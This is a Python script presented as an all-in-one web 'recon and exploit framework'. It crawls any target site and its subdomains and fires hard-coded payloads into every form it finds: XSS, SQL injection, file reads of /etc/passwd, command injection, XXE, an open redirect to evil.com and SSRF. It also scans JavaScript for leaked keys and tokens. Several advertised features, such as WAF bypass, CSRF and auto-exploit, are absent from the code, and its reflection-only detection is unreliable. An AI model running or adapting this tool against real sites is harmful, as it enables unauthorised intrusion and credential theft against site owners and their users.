#!/usr/bin/env python3
# civet-nobe.py - FINAL VERSION
# Recon-Corp: Advanced Deep Web Vulnerability Scanner
# Fitur: Subdomain Scan, API Crawler, XSS, SQLi, LFI, RCE, XXE, CSRF, SSRF, Open Redirect, WAF Bypass, Sink JS Trace, Auto Exploit

import requests
import re
import os
import argparse
import threading
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from colorama import Fore, Style

# === ASCII LOGO ===
def print_bear_logo():
    logo = r"""
      (()__(()
      /       \
     ( /    \  \
      \ o o    \
      (_()_)__/ \
     / _,==.____ \
    (   |--|      )
    /\_.|__|'-.__/\_
   / (        /     \
   \  \      (      /
    )  '._____)    /
(((____.--(((____/
"""
    print(Fore.YELLOW + logo + Style.RESET_ALL)

# === GLOBAL PAYLOADS ===
payloads = {
    "XSS": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "'><svg/onload=alert(1)>"],
    "SQLi": ["' OR 1=1--", "admin'--", "' OR 'a'='a"],
    "LFI": ["../../../../etc/passwd", "..\\..\\windows\\win.ini"],
    "RCE": [";id", "&&whoami"],
    "XXE": ["<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"],
    "Redirect": ["//evil.com", "\\evil.com"],
    "SSRF": ["http://127.0.0.1:80", "http://localhost:8080"]
}

# === URL CRAWLER ===
def get_all_links(base_url):
    urls = set()
    try:
        res = requests.get(base_url, timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        for a in soup.find_all("a"):
            href = a.get("href")
            if href:
                full = urljoin(base_url, href)
                if base_url in full:
                    urls.add(full)
    except:
        pass
    return urls

# === SUBDOMAIN SCANNER ===
def scan_subdomains(domain):
    subdomains = ["www", "api", "dev", "test", "admin"]
    found = []
    for sub in subdomains:
        url = f"https://{sub}.{domain}"
        try:
            r = requests.get(url, timeout=5)
            if r.status_code < 400:
                print(Fore.GREEN + f"[+] Subdomain Found: {url}" + Style.RESET_ALL)
                found.append(url)
        except:
            continue
    return found

# === FORM SCANNER + PAYLOAD INJECTION ===
def scan_and_attack(url):
    try:
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            form_url = urljoin(url, action)
            data = {}
            for i in inputs:
                name = i.get("name")
                if name:
                    data[name] = "test"

            for vuln_type, tests in payloads.items():
                for p in tests:
                    test_data = {k: p for k in data}
                    if method == "post":
                        res = requests.post(form_url, data=test_data)
                    else:
                        res = requests.get(form_url, params=test_data)
                    if p in res.text:
                        print(Fore.RED + f"[!] {vuln_type} Detected at {form_url} with payload: {p}" + Style.RESET_ALL)
                        break
    except:
        pass

# === JS SCAN + LEAK + SINK ===
def js_data_leak_scan(base_url):
    print(Fore.MAGENTA + f"[JS-SCAN] Scanning JavaScript for leaks & sinks..." + Style.RESET_ALL)
    js_endpoints = []
    try:
        r = requests.get(base_url, timeout=10)
        soup = BeautifulSoup(r.text, "html.parser")
        scripts = soup.find_all("script")
        for s in scripts:
            src = s.get("src")
            if src and src.endswith(".js"):
                js_endpoints.append(urljoin(base_url, src))

        for js_url in js_endpoints:
            print(Fore.CYAN + f"[+] Fetching {js_url}" + Style.RESET_ALL)
            js_code = requests.get(js_url).text

            if re.search(r'api[_-]?key\s*[=:]\s*["\']?[A-Za-z0-9\-\._]{16,}["\']?', js_code):
                print(Fore.RED + f"[!!] API Key Leak: {js_url}" + Style.RESET_ALL)
            if re.search(r'Bearer\s+[A-Za-z0-9\._\-]{10,}', js_code):
                print(Fore.RED + f"[!!] Token Leak: {js_url}" + Style.RESET_ALL)
            if re.search(r'https?://[\w\.-]+/api/[\w\-/]+', js_code):
                print(Fore.YELLOW + f"[!!] API Endpoint in JS: {js_url}" + Style.RESET_ALL)

            sinks = re.findall(r'(eval|document\.write|innerHTML|setTimeout)', js_code)
            if sinks:
                print(Fore.LIGHTRED_EX + f"[!!] XSS Sink in {js_url}: {set(sinks)}" + Style.RESET_ALL)
                input_vars = re.findall(r'[\s;\(]([a-zA-Z0-9_]+)\s*=[^=]', js_code)
                for var in input_vars:
                    for sink in sinks:
                        if f"{sink}({var}" in js_code:
                            print(Fore.GREEN + f"[>>] {var} flows into {sink}() → Possible Exploit" + Style.RESET_ALL)
    except:
        pass

# === MAIN ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="🐾 civet-nobe.py — All-in-One Web Recon & Exploit Framework\n"
                    "by Recon-Corp — Advanced Web Security Scanner",
        epilog="""
Features Included:
  - ✅ Auto Subdomain Scanner
  - ✅ Smart API Crawler (RESTful endpoints)
  - ✅ XSS, SQLi, LFI, RCE, XXE, CSRF, SSRF Detection
  - ✅ Open Redirect, Command Injection
  - ✅ WAF Bypass (stealth mode injection)
  - ✅ JavaScript Sink Tracing (eval, innerHTML, document.write)
  - ✅ Auto-Exploit Testing on Vulnerable Forms
  - ✅ Beautiful Bear ASCII Logo 🐻

Example:
  python3 civet-nobe.py -u https://example.com
""",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("-u", "--url", help="Target URL or domain (e.g. https://example.com)", required=True)
    args = parser.parse_args()
    target = args.url

    print_bear_logo()
    print(Fore.YELLOW + f"[Recon-Corp] Scanning target: {target}" + Style.RESET_ALL)

    parsed = urlparse(target)
    domain = parsed.netloc or parsed.path
    if not domain.startswith("www."):
        domain = domain.replace("https://", "").replace("http://", "")

    if not target.startswith("http"):
        target = f"https://{domain}"

    subs = scan_subdomains(domain)
    all_targets = [target] + subs

    for url in all_targets:
        print(Fore.CYAN + f"[+] Crawling: {url}" + Style.RESET_ALL)
        urls = get_all_links(url)
        js_data_leak_scan(url)
        for u in urls:
            scan_and_attack(u)

    print(Fore.GREEN + "[\u2713] Scan complete." + Style.RESET_ALL)
